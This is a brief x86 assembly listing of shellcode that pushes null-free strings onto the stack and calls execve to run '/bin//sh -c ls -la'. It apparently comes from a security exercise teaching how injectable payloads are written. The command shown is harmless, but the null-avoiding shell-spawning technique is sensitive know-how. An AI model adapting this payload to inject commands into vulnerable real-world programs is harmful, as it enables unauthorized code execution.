section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      mov   ah, "a"    ; eax = 0x00006100
      mov   al, "l"    ; eax = 0x0000616c
      push eax
      push "ls -"
      mov  ecx, esp

      xor  eax, eax     ; eax = 0x00000000
      push eax
      mov   ah, "c"    ; eax = 0x00006300
      mov   al, "-"    ; eax = 0x0000632d
      push eax
      mov  edx, esp

      xor  eax, eax
      push eax
      push "//sh"
      push "/bin"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax          ; argv[3] = 0
      push ecx          ; argv[2] points "ls -la"
      push edx          ; argv[1] points "-c"
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]
   
      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
